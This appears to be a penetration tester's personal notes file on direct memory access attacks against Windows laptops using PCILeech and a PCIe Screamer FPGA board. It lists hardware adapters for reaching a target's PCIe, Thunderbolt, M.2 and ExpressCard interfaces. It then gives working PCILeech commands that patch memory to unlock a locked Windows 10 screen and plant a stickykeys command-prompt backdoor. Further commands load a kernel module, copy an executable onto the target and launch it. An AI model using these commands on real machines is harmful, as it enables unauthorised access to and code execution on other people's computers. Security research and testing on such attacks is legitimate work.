

PCIe form factors
#https://www.youtube.com/watch?v=XcEYkcwbRX8&feature=youtu.be&t=17m40s
#Thunderbolt (and USB-C that have Thunderbolt support);
	#Since windows 10 1803, thunderbolt driver is not loaded on lock screen
#M.2 key A/E (mostly Wi-Fi and Bluetooth integrated cards);
#M.2 key B/M (mostly SSD with NVMe support);
#ExpressCard expansion slot

PCIScreamer is PCIe x1 Gen 2.0

Recommended adapters 
Female to male (from PCIScreamer to target laptop):
PE3B - mini-PCIe to ExpressCard (http://www.hwtools.net/Adapter/PE3B.html)
->	PE3A - PCIe to ExpressCard (http://www.hwtools.net/Adapter/PE3A.html)
ADP - mini-PCIe to PCIe
P15S-P15F - mini-PCIe to M.2 Key A+E
Sonnet Echo ExpressCard Pro - ExpressCard to Thunderbolt (DP)
Apple Thunderbolt3 (USB-C) - DP to USB-C
#My own research:
->	PCI-e 1X/4X Card to NGFF M.2 M Key PCIe Slot Adapter - PCIe to M.2

#Flashing the board
#Required on first use of the PCIScreamer
#https://github.com/ufrisk/pcileech-fpga
#https://github.com/ufrisk/pcileech-fpga/tree/master/pciescreamer

#PCIscreamer plug instructions
#http://blog.lambdaconcept.com/doku.php?id=products:pcie_screamer
#https://docs.lambdaconcept.com/screamer/older_versions.html
#https://docs.lambdaconcept.com/screamer/_images/__gh_pciescreamer2.jpg
#vu comme: Future Devices FTDI SuperSpeed-FIFO Bridge
#se bridge tres mal via VMware vers une VM

#https://github.com/ufrisk/pcileech
#install instructions for linux: https://github.com/ufrisk/pcileech/wiki/PCILeech-on-Linux
insmod ft60x.ko
ls -l /dev/ft60x[0-3]



#probe the device:
#use NATIVE mode with FPGA device (KMD not needed)
> pcileech.exe testmemread
> pcileech.exe probe -device FPGA #-device FPGA is optionnal as USB and FPGA are used by default
#if screen is locked
> pcileech.exe patch -sig unlock_win10x64
> pcileech.exe patch -sig stickykeys_cmd_win

#if screen is not locked
#Load the kernel module
#WIN10_X64_3 is windows10 2004 and later
>.\pcileech.exe -kmd WIN10_X64_2 kmdload
>.\pcileech.exe -kmd 0x7ffff000 wx64_filepush -in C:\Users\Rom\Documents\missions\yas.exe -s \??\c:\yas.exe
>.\pcileech.exe -kmd 0x7ffff000 wx64_pslist 
>.\pcileech.exe -kmd 0x7ffff000 wx64_pscreate -1 0x00000010 -s C:\Windows\ccmcache\yas.exe -0 4


#Docs
#https://i.blackhat.com/USA-19/Wednesday/us-19-Sandin-PicoDMA-DMA-Attacks-At-Your-Fingertips.pdf
https://www.synacktiv.com/posts/pentest/practical-dma-attack-on-windows-10.html
https://www.synacktiv.com/ressources/IOMMU_and_DMA_attacks_presentation_16_9.pdf
